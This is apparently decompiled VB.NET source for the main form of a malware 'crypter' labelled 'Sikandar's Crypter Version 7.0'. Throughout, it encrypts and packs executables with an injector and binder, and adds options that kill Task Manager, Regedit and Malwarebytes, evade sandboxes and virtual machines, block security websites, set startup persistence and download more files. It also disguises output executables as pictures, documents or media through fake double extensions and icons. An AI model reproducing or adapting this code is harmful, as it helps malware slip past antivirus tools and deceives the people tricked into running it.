    Private Sub method_6(ByVal sender As Object, ByVal e As EventArgs)
    End Sub

    Private Sub method_7(ByVal sender As Object, ByVal e As EventArgs)
        If Me.vmethod_92.Checked Then
            Me.vmethod_88.Checked = True
        End If
    End Sub

    Private Sub method_8(ByVal sender As Object, ByVal e As EventArgs)
        Me.openFileDialog_1.DefaultExt = "ico"
        Me.openFileDialog_1.Filter = "Icon Files (*.ico*)|*.ico*"
        Me.openFileDialog_1.FilterIndex = 1
        Me.openFileDialog_1.FileName = String.Empty
        If (Me.openFileDialog_1.ShowDialog(Me) = DialogResult.OK) Then
            Me.vmethod_30.Text = Me.openFileDialog_1.FileName
        End If
    End Sub

    Private Sub method_9(ByVal sender As Object, ByVal e As EventArgs)
        If Not Me.vmethod_162.Checked Then
            MessageBox.Show("Please AGREE with the author's TERMS and CONDITIONS.", "Confirm", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
        Else
            If Me.vmethod_4.Checked Then
                If (Me.vmethod_172.Items.Count = 0) Then
                    MessageBox.Show("Please load the file to be protected.", "Load", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                    Return
                End If
                If ((Not Me.vmethod_234.Checked AndAlso Me.bool_0) AndAlso (Me.vmethod_174.Text = "Resource to Use...")) Then
                    MessageBox.Show("Please browse the resource for the injector.", "Injector", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                    Return
                End If
                Me.saveFileDialog_0.AddExtension = True
                Me.saveFileDialog_0.Filter = "Executable Files (*.exe)|*.exe|Com Files (*.com)|*.com|Batch Files (*.bat)|*.bat|Program Information File (*.pif)|*.pif|Screen Saver Files (*.scr)|*.scr|Picture Files (*.jpg)|*.jpg|Picture Files (*.png)|*.png|Audio Video Interleave Files (*.avi)|*.avi|Windows Media Movie (*.wmv)|*.wmv|Windows Media Audio (*.wma)|*.wma|Music File (*.mp3)|*.mp3|Video File (*.mp4)|*.mp4|Text File (*.txt)|*.txt|Document File (*.doc)|*.doc|Information File (*.inf)|*.inf|Dynamic Link Library (*.dll)|*.dll|Archive File (*.rar)|*.rar|Icon File (*.ico)|*.ico|Ini File (*.ini)|*.ini|Portable Document Format (*.pdf)|*.pdf|Web Page (*.htm)|*.htm"
                If (Me.saveFileDialog_0.ShowDialog <> DialogResult.OK) Then
                    Return
                End If
                Me.string_2 = Me.saveFileDialog_0.FileName
                Me.vmethod_164.Minimum = 0
                Me.vmethod_164.Maximum = 10
                Dim bytes As Byte() = Nothing
                Dim str As String = Nothing
                Dim buffer2 As Byte() = Nothing
                Dim str2 As String = Nothing
                Dim str3 As String = Class7.smethod_20
                Dim newValue As String = Class7.smethod_20
                Dim i As String = Class7.smethod_6
                Dim text As String = Me.vmethod_32.Text
                Dim buffer3 As Byte() = Encoding.Default.GetBytes([text])
                Dim oldValue As String = "'Encryption"
                Using writer As ResourceWriter = New ResourceWriter(Me.string_0)
                    Dim num As Integer = (Me.vmethod_172.Items.Count - 1)
                    Dim j As Integer = 0
                    Do While (j <= num)
                        bytes = File.ReadAllBytes(Conversions.ToString(Me.vmethod_172.Items.Item(j)))
                        str = Encoding.Default.GetString(bytes)
                        If ((Form1.int_2 = 1) AndAlso Me.vmethod_38.Checked) Then
                            Dim items As ObjectCollection = Me.vmethod_172.Items
                            Dim num3 As Integer = 0
                            Dim filePath As String = Conversions.ToString(items.Item(num3))
                            items.Item(num3) = filePath
                            Me.string_4 = Me.ReadEOFData((filePath))
                        End If
                        Dim name As String = "FF"
                        Dim str10 As String = "SS"
                        Dim str11 As String = "TT"
                        Dim str12 As String = "UU"
                        Select Case j
                            Case 1
                                Dim str13 As String = Path.GetFileName(Me.vmethod_172.Items.Item(1).ToString)
                                writer.AddResource(name, str13)
                                Exit Select
                            Case 2
                                Dim str14 As String = Path.GetFileName(Me.vmethod_172.Items.Item(2).ToString)
                                writer.AddResource(str10, str14)
                                Exit Select
                            Case 3
                                Dim str15 As String = Path.GetFileName(Me.vmethod_172.Items.Item(3).ToString)
                                writer.AddResource(str11, str15)
                                Exit Select
                            Case 4
                                Dim str16 As String = Path.GetFileName(Me.vmethod_172.Items.Item(4).ToString)
                                writer.AddResource(str12, str16)
                                Exit Select
                        End Select
                        If Me.vmethod_20.Checked Then
                            buffer2 = GClass2.smethod_3(bytes, buffer3)
                            If Class1.smethod_3.method_1.vmethod_22.Checked Then
                                writer.AddResource(("Z" & Conversions.ToString(j)), Encoding.Default.GetString(buffer2))
                            Else
                                writer.AddResource(("Z" & Conversions.ToString(j)), Convert.ToBase64String(buffer2))
                                newValue = newValue.Replace("System.Text.Encoding.Default.GetBytes(bytes)", "Convert.FromBase64String(bytes)")
                            End If
                            Me.string_3 = Me.string_3.Replace(oldValue, newValue)
                            i = i.Replace("'ENC", Class7.smethod_10)
                        ElseIf Me.vmethod_18.Checked Then
                            buffer2 = GClass2.smethod_4(bytes, buffer3)
                            Me.string_3 = Me.string_3.Replace(oldValue, Class7.smethod_25)
                            i = i.Replace("'ENC", Class7.smethod_12)
                            writer.AddResource(("Z" & Conversions.ToString(j)), Encoding.Default.GetString(buffer2))
                        ElseIf Me.vmethod_28.Checked Then
                            buffer2 = DirectCast(GClass2.smethod_5(bytes), Byte())
                            Me.string_3 = Me.string_3.Replace(oldValue, Class7.smethod_16)
                            i = i.Replace("'ENC", Class7.smethod_9)
                            writer.AddResource(("Z" & Conversions.ToString(j)), Encoding.Default.GetString(buffer2))
                        ElseIf Me.vmethod_26.Checked Then
                            buffer2 = GClass2.smethod_6(bytes, buffer3)
                            Me.string_3 = Me.string_3.Replace(oldValue, Class7.smethod_19)
                            writer.AddResource(("Z" & Conversions.ToString(j)), Encoding.Default.GetString(buffer2))
                        ElseIf Me.vmethod_16.Checked Then
                            str2 = GClass2.smethod_2(str, [text], True)
                            Me.string_3 = Me.string_3.Replace(oldValue, Class7.smethod_24)
                            writer.AddResource(("Z" & Conversions.ToString(j)), str2)
                        ElseIf Me.vmethod_14.Checked Then
                            buffer2 = GClass2.smethod_1(bytes, buffer3)
                            Me.string_3 = Me.string_3.Replace(oldValue, Class7.smethod_21)
                            i = i.Replace("'ENC", Class7.smethod_11)
                            writer.AddResource(("Z" & Conversions.ToString(j)), Encoding.Default.GetString(buffer2))
                        ElseIf Me.vmethod_24.Checked Then
                            str2 = New GClass3([text]).method_0(str)
                            Me.string_3 = Me.string_3.Replace(oldValue, Class7.smethod_17)
                            writer.AddResource(("Z" & Conversions.ToString(j)), str2)
                        ElseIf Me.vmethod_22.Checked Then
                            buffer2 = GClass2.smethod_0((bytes), buffer3, 0)
                            Me.string_3 = Me.string_3.Replace(oldValue, Class7.smethod_18)
                            writer.AddResource(("Z" & Conversions.ToString(j)), Encoding.Default.GetString(buffer2))
                        End If
                        j += 1
                    Loop
                    Me.vmethod_164.Value = 1
                    If (((((Me.vmethod_20.Checked Or Me.vmethod_18.Checked) Or Me.vmethod_28.Checked) Or Me.vmethod_26.Checked) Or Me.vmethod_14.Checked) Or Me.vmethod_22.Checked) Then
                        writer.AddResource("K", Encoding.Default.GetString(buffer3))
                    ElseIf (Me.vmethod_16.Checked Or Me.vmethod_24.Checked) Then
                        writer.AddResource("K", [text])
                    End If
                    Me.vmethod_164.Value = 2
                    Me.vmethod_164.Value = 3
                    writer.AddResource("i", Form1.int_2)
                    If Me.bool_0 Then
                        writer.AddResource("R", Form1.Scram(Class7.smethod_42))
                        If Not Me.vmethod_234.Checked Then
                            Dim buffer4 As Byte() = File.ReadAllBytes(Me.vmethod_174.Text)
                            Dim str17 As String = Encoding.Default.GetString(buffer4)
                            Dim buffer5 As Byte() = Encoding.Default.GetBytes(Me.vmethod_180.Text)
                            If Me.vmethod_20.Checked Then
                                If Class1.smethod_3.method_1.vmethod_22.Checked Then
                                    writer.AddResource("Inj", Encoding.Default.GetString(GClass2.smethod_3(buffer4, buffer3)))
                                    writer.AddResource("Na", Encoding.Default.GetString(GClass2.smethod_3(buffer5, buffer3)))
                                Else
                                    writer.AddResource("Inj", Convert.ToBase64String(GClass2.smethod_3(buffer4, buffer3)))
                                    writer.AddResource("Na", Convert.ToBase64String(GClass2.smethod_3(buffer5, buffer3)))
                                End If
                            ElseIf Me.vmethod_18.Checked Then
                                writer.AddResource("Inj", Encoding.Default.GetString(GClass2.smethod_4(buffer4, buffer3)))
                                writer.AddResource("Na", Encoding.Default.GetString(GClass2.smethod_4(buffer5, buffer3)))
                            ElseIf Me.vmethod_28.Checked Then
                                writer.AddResource("Inj", Encoding.Default.GetString(DirectCast(GClass2.smethod_5(buffer4), Byte())))
                                writer.AddResource("Na", Encoding.Default.GetString(DirectCast(GClass2.smethod_5(buffer5), Byte())))
                            ElseIf Me.vmethod_26.Checked Then
                                writer.AddResource("Inj", Encoding.Default.GetString(GClass2.smethod_6(buffer4, buffer3)))
                                writer.AddResource("Na", Encoding.Default.GetString(GClass2.smethod_6(buffer5, buffer3)))
                            ElseIf Me.vmethod_16.Checked Then
                                writer.AddResource("Inj", GClass2.smethod_2(str17, [text], True))
                                writer.AddResource("Na", GClass2.smethod_2(Me.vmethod_180.Text, [text], True))
                            ElseIf Me.vmethod_14.Checked Then
                                writer.AddResource("Inj", Encoding.Default.GetString(GClass2.smethod_1(buffer4, buffer3)))
                                writer.AddResource("Na", Encoding.Default.GetString(GClass2.smethod_1(buffer5, buffer3)))
                            ElseIf Me.vmethod_24.Checked Then
                                Dim class3 As New GClass3([text])
                                writer.AddResource("Inj", class3.method_0(str17))
                                writer.AddResource("Na", class3.method_0(Me.vmethod_180.Text))
                            ElseIf Me.vmethod_22.Checked Then
                                writer.AddResource("Inj", Encoding.Default.GetString(GClass2.smethod_0((buffer4), buffer3, 0)))
                                writer.AddResource("Na", Encoding.Default.GetString(GClass2.smethod_0((buffer5), buffer3, 0)))
                            End If
                        Else
                            Me.string_3 = Me.string_3.Replace("Dim Na As String = System.Text.Encoding.Default.GetString(ENC(An, Pn))", Nothing)
                            Me.string_3 = Me.string_3.Replace("LM(""C"", ""T"", Scram(R.GetObject(""L"")), New Object() {ooo, YT})", Nothing)
                        End If
                    Else
                        Me.string_3 = Me.string_3.Replace("Dim Na As String = System.Text.Encoding.Default.GetString(ENC(An, Pn))", Nothing)
                        Me.string_3 = Me.string_3.Replace("Dim ooo As String = Environ(Scram(R.GetObject(""X""))) & " & ChrW(206) & " & Na & "".exe""", Nothing)
                        Me.string_3 = Me.string_3.Replace("LM(""C"", ""T"", LL, New Object() {ooo, YT})", Nothing)
                        Me.string_3 = Me.string_3.Replace("Dim YT As Byte() = ENC(R.GetObject(""Inj""), Pn)", Nothing)
                        writer.AddResource("NV", Form1.Scram(Class7.smethod_30))
                        Dim str18 As String = "LM(""IIN"", ""C"", Scram(R.GetObject(""NV"")), New Object() {D})"
                        Me.string_3 = Me.string_3.Replace("LM(""IX"", ""AA"", Scram(R.GetObject(""R"")), New Object() {D, ooo})", str18)
                    End If
                    If Me.vmethod_104.Checked Then
                        Me.string_3 = Me.string_3.Replace("'CallWebBlock", "LM(""WB"", ""Blocker"", Reverser(R.GetObject(""WB"")), New Object() {})")
                        writer.AddResource("WB", Form1.ScrambleCode(Class7.smethod_51))
                    End If
                    Dim file As String = (Application.StartupPath & "\ch")
                    If Me.vmethod_102.Checked Then
                        Try 
                            Class1.smethod_0.FileSystem.WriteAllBytes(file, New Byte(0  - 1) {}, False)
                            Me.PumpFile(file, Convert.ToInt32(Me.vmethod_100.Value))
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            ProjectData.ClearProjectError
                        End Try
                        writer.AddResource("ch", File.ReadAllBytes(file))
                    End If
                    Me.vmethod_164.Value = 4
                    If (((((((((((((((((((Me.vmethod_36.Checked Or Me.vmethod_34.Checked) Or Me.vmethod_44.Checked) Or Me.vmethod_42.Checked) Or Me.vmethod_40.Checked) Or Me.vmethod_46.Checked) Or Me.vmethod_54.Checked) Or Me.vmethod_52.Checked) Or Me.vmethod_50.Checked) Or Me.vmethod_48.Checked) Or Me.vmethod_60.Checked) Or Me.vmethod_58.Checked) Or Me.vmethod_56.Checked) Or Me.vmethod_64.Checked) Or Me.vmethod_62.Checked) Or Me.vmethod_70.Checked) Or Me.vmethod_68.Checked) Or Me.vmethod_66.Checked) Or Me.vmethod_76.Checked) Or Me.vmethod_74.Checked) Then
                        Me.Check_Anti_Functions
                        writer.AddResource("W", Form1.Scram(Me.string_5))
                        Me.string_3 = Me.string_3.Replace("'CallAntis", "LM(""Antis"", ""A"", Scram(R.GetObject(""W"")), New Object() {})")
                    End If
                    writer.AddResource("Y", Form1.Scram(Class7.smethod_43))
                    writer.AddResource("CT", Form1.Scram(Class7.smethod_8))
                    If Me.vmethod_108.Checked Then
                        writer.AddResource("YQ", Form1.Scram(Class7.smethod_38))
                    End If
                    writer.AddResource("X", Form1.Scram("APPDATA"))
                    writer.AddResource("J", Form1.Scram("\"))
                    If Me.vmethod_88.Checked Then
                        If Me.vmethod_92.Checked Then
                            writer.AddResource("SL", Form1.Scram(Class7.smethod_45))
                        Else
                            writer.AddResource("SL", Form1.Scram(Class7.smethod_46))
                        End If
                    End If
                    If (Form1.int_2 > 1) Then
                        writer.AddResource("BR", Form1.Scram(i))
                        Me.string_3 = Me.string_3.Replace("'Binder_Replacement", "LM(""C"", ""F"", Scram(R.GetObject(""BR"")), New Object() {R.GetObject(""Z1""), Pn, R.GetObject(""FF"")})")
                    End If
                    writer.Generate
                    i = Class7.smethod_7
                    Me.vmethod_164.Value = 5
                    Try 
                        File.Delete(file)
                    Catch exception2 As Exception
                        ProjectData.SetProjectError(exception2)
                        ProjectData.ClearProjectError
                    End Try
                End Using
                Me.vmethod_164.Value = 6
                Me.Check_Special_Functions
                Me.Algorithm
                Me.string_3 = Me.string_3.Replace("'AssemblyCodes", Conversions.ToString(Me.Assembly))
                Me.Compile(Me.string_3, Me.string_2, True, "A", False, False, Me.string_0)
                Me.vmethod_164.Value = 7
                If Me.vmethod_90.Checked Then
                    Using writer2 As ResourceWriter = New ResourceWriter(Me.string_1)
                        writer2.AddResource("F", Form1.Compress(File.ReadAllBytes(Me.string_2)))
                        writer2.Generate
                    End Using
                    File.Delete(Me.string_2)
                    Me.Compile(Class7.smethod_28, Me.string_2, True, "B", False, False, Me.string_1)
                    File.Delete(Me.string_1)
                End If
                Me.vmethod_164.Value = 8
                If (((((((((((((((((((Me.string_2.Contains(".bat") Or Me.string_2.Contains(".scr")) Or Me.string_2.Contains(".com")) Or Me.string_2.Contains(".pif")) Or Me.string_2.Contains(".jpg")) Or Me.string_2.Contains(".png")) Or Me.string_2.Contains(".avi")) Or Me.string_2.Contains(".wmv")) Or Me.string_2.Contains(".wma")) Or Me.string_2.Contains(".mp3")) Or Me.string_2.Contains(".mp4")) Or Me.string_2.Contains(".txt")) Or Me.string_2.Contains(".doc")) Or Me.string_2.Contains(".inf")) Or Me.string_2.Contains(".dll")) Or Me.string_2.Contains(".rar")) Or Me.string_2.Contains(".ico")) Or Me.string_2.Contains(".ini")) Or Me.string_2.Contains(".pdf")) Or Me.string_2.Contains(".htm")) Then
                    Me.Call_Yes_No
                    Me.string_2 = (Me.string_2 & ".exe")
                ElseIf (Me.vmethod_30.Text = Me.openFileDialog_1.FileName) Then
                    GClass1.smethod_0(Me.string_2, Me.openFileDialog_1.FileName)
                End If
                If Me.vmethod_38.Checked Then
                    File.AppendAllText(Me.string_2, Me.string_4)
                End If
                Using stream As FileStream = New FileStream(Me.string_2, FileMode.Open, FileAccess.Write)
                    If Me.vmethod_82.Checked Then
                        stream.Seek(&HF4, SeekOrigin.Begin)
                        stream.WriteByte(11)
                    End If
                    stream.Close
                End Using
                Me.vmethod_164.Value = 9
                Dim fileName As String = Path.GetFileName(Me.string_2)
                Dim str21 As String = Nothing
                str21 = Strings.Left(fileName, (fileName.Length - 4))
                If (((Me.string_2.Contains(".bat") Or Me.string_2.Contains(".scr")) Or Me.string_2.Contains(".com")) Or Me.string_2.Contains(".pif")) Then
                    Class1.smethod_0.FileSystem.MoveFile(Me.string_2, (Path.GetDirectoryName(Me.string_2) & "\" & str21))
                ElseIf (((((((((((((((Me.string_2.Contains(".jpg") Or Me.string_2.Contains(".png")) Or Me.string_2.Contains(".avi")) Or Me.string_2.Contains(".wmv")) Or Me.string_2.Contains(".wma")) Or Me.string_2.Contains(".mp3")) Or Me.string_2.Contains(".mp4")) Or Me.string_2.Contains(".txt")) Or Me.string_2.Contains(".doc")) Or Me.string_2.Contains(".inf")) Or Me.string_2.Contains(".dll")) Or Me.string_2.Contains(".rar")) Or Me.string_2.Contains(".ico")) Or Me.string_2.Contains(".ini")) Or Me.string_2.Contains(".pdf")) Or Me.string_2.Contains(".htm")) Then
                    Dim fileNameWithoutExtension As String = Path.GetFileNameWithoutExtension(Path.GetFileNameWithoutExtension(Me.string_2))
                    str21 = (Form1.Get_Extension(str21) & ".exe")
                    Dim str23 As String = (fileNameWithoutExtension & " " & str21)
                    Class1.smethod_0.FileSystem.MoveFile(Me.string_2, (Path.GetDirectoryName(Me.string_2) & "\" & str23))
                End If
                File.Delete(Me.string_0)
                Me.vmethod_164.Value = 10
                MessageBox.Show("Successfully encrypted PE file using the managed algorithm.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
                Me.string_3 = Class7.smethod_40
                Me.string_5 = Class7.smethod_4
                newValue = str3
                Me.vmethod_164.Value = 0
            End If
            If Me.vmethod_166.Checked Then
                Me.Write_Log
            End If
        End If
    End Sub

    Public Function PumpFile(ByVal xFile As String, ByVal xKilobytes As Integer) As String
        Dim stream As FileStream = File.OpenWrite(xFile)
        Dim num As Long = stream.Seek(0, SeekOrigin.End)
        Dim num3 As New Decimal((Convert.ToInt32(xKilobytes) * &H418))
        Do While (Decimal.Compare(New Decimal(num), num3) < 0)
            num += 1
            stream.WriteByte(0)
        Loop
        stream.Close
        Return Conversions.ToString(0)
    End Function

    Public Shared Function Random_Pass() As String
        Dim strArray As String() = Strings.Split(Guid.NewGuid.ToString, "-", -1, CompareMethod.Binary)
        Dim str As String = Nothing
        Dim index As Integer = 0
        Do
            str = (str & strArray(index))
            index += 1
        Loop While (index <= 4)
        Return str
    End Function

    Public Function ReadEOFData(ByRef FilePath As String) As String
        If (FileSystem.Dir(FilePath, FileAttribute.Normal) = Nothing) Then
            Return Nothing
        End If
        Dim expression As String = File.ReadAllText(FilePath)
        Dim lNum As Object = 30
        Dim num As Integer = Strings.InStr(1, Strings.StrReverse(expression), Me.GetNullBytes((lNum)), CompareMethod.Binary)
        Dim str2 As String = Strings.StrReverse(Strings.Mid(Strings.StrReverse(expression), 1, (num - 1)))
        If (str2 = Nothing) Then
        End If
        Return str2
    End Function

    Public Shared Function Reverse(ByVal s As String) As String
        Dim array As Char() = s.ToCharArray
        Array.Reverse(array)
        Return New String(array)
    End Function

    Public Shared Function Scram(ByVal I As String) As String
        Dim bytes As Byte() = Form1.XQ(Encoding.Default.GetBytes(I), New Byte() { 1 })
        Return Encoding.Default.GetString(bytes)
    End Function

    Public Shared Function ScrambleCode(ByVal s As String) As String
        s = s.Replace("e"c, "#"c)
        s = s.Replace("a"c, Strings.Chr(&HC3))
        s = s.Replace("i"c, Strings.Chr(200))
        Dim array As Char() = s.ToCharArray
        Array.Reverse(array)
        Return New String(array)
    End Function

    Public Shared Function String_Base64(ByVal S As String) As String
        Dim str As String = Nothing
        Try 
            str = Convert.ToBase64String(Encoding.UTF8.GetBytes(S))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError
        End Try
        Return str
    End Function

    Public Shared Function StringE(ByVal Input As String, ByVal Pass As String) As String
        Dim str As String = Nothing
        Dim num As Long = Strings.Len(Input)
        Dim i As Long = 1
        Do While (i <= num)
            Dim num3 As Integer = Strings.Asc(Strings.Mid(Input, CInt(i), 1))
            Dim num4 As Integer = Strings.Asc(Strings.Mid(Pass, (CInt((i Mod CLng(Strings.Len(Pass)))) + 1), 1))
            Dim number As Integer = (num3 Xor num4)
            Dim expression As String = Conversion.Hex(number)
            If (Strings.Len(expression) = 1) Then
                expression = ("0" & expression)
            End If
            str = (str & expression)
            i += 1
        Loop
        Return str
    End Function
  Public Sub Write_Log()
        Dim newLine As String = Environment.NewLine
        Dim str2 As String = ("Sikandar's Crypter Version 7.0 Log" & newLine & newLine)
        Dim writer As New StreamWriter((Path.GetFileName(Me.string_2) & ".Report.log"))
        writer.Write(str2)
        If Me.vmethod_20.Checked Then
            writer.Write(("Encryption: RC4" & newLine))
        ElseIf Me.vmethod_18.Checked Then
            writer.Write(("Encryption: XOR" & newLine))
        ElseIf Me.vmethod_28.Checked Then
            writer.Write(("Encryption: AES" & newLine))
        ElseIf Me.vmethod_26.Checked Then
            writer.Write(("Encryption: PXOR" & newLine))
        ElseIf Me.vmethod_16.Checked Then
            writer.Write(("Encryption: TDES" & newLine))
        ElseIf Me.vmethod_14.Checked Then
            writer.Write(("Encryption: Stairs" & newLine))
        ElseIf Me.vmethod_24.Checked Then
            writer.Write(("Encryption: PRC4" & newLine))
        ElseIf Me.vmethod_22.Checked Then
            writer.Write(("Encryption: PStairs" & newLine & newLine))
        End If
        writer.Write(("Password: " & Me.vmethod_32.Text & newLine & newLine))
        writer.Write(("Antis and Killers" & newLine))
        If Me.vmethod_36.Checked Then
            writer.Write(("Task Manager: Enabled" & newLine))
        End If
        If Me.vmethod_34.Checked Then
            writer.Write(("Regedit: Enabled" & newLine))
        End If
        If Me.vmethod_44.Checked Then
            writer.Write(("Msconfig: Enabled" & newLine))
        End If
        If Me.vmethod_42.Checked Then
            writer.Write(("Notepad: Enabled" & newLine))
        End If
        If Me.vmethod_40.Checked Then
            writer.Write(("Dxdiag: Enabled" & newLine))
        End If
        If Me.vmethod_46.Checked Then
            writer.Write(("Folder Options: Enabled" & newLine))
        End If
        If Me.vmethod_54.Checked Then
            writer.Write(("Wireshark: Enabled" & newLine))
        End If
        If Me.vmethod_52.Checked Then
            writer.Write(("Malwarebytes: Enabled" & newLine))
        End If
        If Me.vmethod_50.Checked Then
            writer.Write(("VMWare: Enabled" & newLine))
        End If
        If Me.vmethod_48.Checked Then
            writer.Write(("OllyDbg: Enabled" & newLine))
        End If
        If Me.vmethod_60.Checked Then
            writer.Write(("Virtual Box: Enabled" & newLine))
        End If
        If Me.vmethod_58.Checked Then
            writer.Write(("HijackThis: Enabled" & newLine))
        End If
        If Me.vmethod_56.Checked Then
            writer.Write(("Sandboxie: Enabled" & newLine))
        End If
        If Me.vmethod_64.Checked Then
            writer.Write(("Anubis: Enabled" & newLine))
        End If
        If Me.vmethod_62.Checked Then
            writer.Write(("Anubis 2: Enabled" & newLine))
        End If
        If Me.vmethod_70.Checked Then
            writer.Write(("Keyscrambler: Enabled" & newLine))
        End If
        If Me.vmethod_68.Checked Then
            writer.Write(("Joebox: Enabled" & newLine))
        End If
        If Me.vmethod_66.Checked Then
            writer.Write(("Panda: Enabled" & newLine))
        End If
        If Me.vmethod_76.Checked Then
            writer.Write(("Wine: Enabled" & newLine))
        End If
        If Me.vmethod_74.Checked Then
            writer.Write(("Outpost: Enabled" & newLine & newLine))
        End If
        writer.Write(("Special" & newLine))
        If Me.vmethod_84.Checked Then
            writer.Write(("Melt: Enabled" & newLine))
        End If
        If Me.vmethod_82.Checked Then
            writer.Write(("Reflector Protection: Enabled" & newLine))
        End If
        If Me.vmethod_80.Checked Then
            writer.Write(("Downloader: Enabled - " & Me.vmethod_86.Text & newLine))
        End If
        If Me.vmethod_88.Checked Then
            writer.Write(("Add to Startup: Enabled" & newLine))
        End If
        If Me.vmethod_94.Checked Then
            writer.Write(("Anti Task Manager: Enabled" & newLine))
        End If
        If Me.vmethod_38.Checked Then
            writer.Write(("EOF: Enabled" & newLine))
        End If
        If Me.vmethod_92.Checked Then
            writer.Write(("Startup Persistence: Enabled" & newLine))
        End If
        If Me.vmethod_90.Checked Then
            writer.Write(("Compressor: Enabled" & newLine))
        End If
        If Me.vmethod_96.Checked Then
            writer.Write(("Binder Startup: Enabled" & newLine))
        End If
        If Me.vmethod_102.Checked Then
            writer.Write(("Pumper: Enabled - " & Conversions.ToString(Me.vmethod_100.Value) & " kb" & newLine))
        End If
        If Me.vmethod_104.Checked Then
            writer.Write(("Security Websites Blocker: Enabled" & newLine))
        End If
        If Me.vmethod_110.Checked Then
            writer.Write((".NET Framework Error: Enabled" & newLine))
        End If
        If Me.vmethod_108.Checked Then
            writer.Write(("Protect Process: Enabled" & newLine & newLine))
        End If
        writer.Flush
        writer.Close
    End Sub

    Public Shared Function XQ(ByVal E As Byte(), ByVal P As Byte()) As Byte()
        Dim length As Integer = P.Length
        Dim num2 As Integer = (E.Length - 1)
        Dim i As Integer = 0
        Do While (i <= num2)
            E(i) = CByte((E(i) Xor P((i Mod length))))
            i += 1
        Loop
        Return E
    End Function

    Public Sub Yes_No_Condition(ByVal Res As Byte())
        Dim path As String = (Environment.GetFolderPath(SpecialFolder.ApplicationData) & "\sicktempicon.ico")
        If File.Exists(path) Then
            File.Delete(path)
        End If
        If (MessageBox.Show("Would you like to use the built in icon for the extension?", "Icon", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes) Then
            Class1.smethod_0.FileSystem.WriteAllBytes(path, Res, False)
            GClass1.smethod_0((Me.string_2 & ".exe"), path)
        End If
    End Sub
End Class
